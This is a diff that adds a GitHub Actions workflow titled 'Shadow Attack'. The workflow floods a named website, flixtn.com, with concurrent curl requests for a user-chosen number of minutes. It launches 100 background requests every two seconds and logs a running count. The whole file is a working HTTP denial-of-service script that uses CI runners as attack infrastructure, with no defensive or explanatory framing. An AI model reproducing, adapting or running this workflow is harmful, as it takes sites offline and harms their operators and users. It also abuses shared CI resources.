@@ -1,0 +1,42 @@
+name: 🔥 Shadow Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: 'مدة الهجوم بالدقائق'
+        required: true
+        default: '10'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install tools
+        run: |
+          sudo apt update
+          sudo apt install -y curl
+        
+      - name: Start Attack
+        run: |
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "🔥 Shadow Attack Started"
+          echo "Target: flixtn.com"
+          echo "Duration: ${{ github.event.inputs.duration }} minutes"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          
+          END_TIME=$((SECONDS + (${{ github.event.inputs.duration }} * 60)))
+          COUNT=0
+          
+          while [ $SECONDS -lt $END_TIME ]; do
+            for i in {1..100}; do
+              curl -s -o /dev/null -w "%{http_code}\n" https://flixtn.com/ &
+            done
+            COUNT=$((COUNT + 100))
+            echo "[$(date +%H:%M:%S)] Sent $COUNT requests"
+            sleep 2
+          done
+          
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "✅ Attack Finished"
+          echo "Total requests: $COUNT"
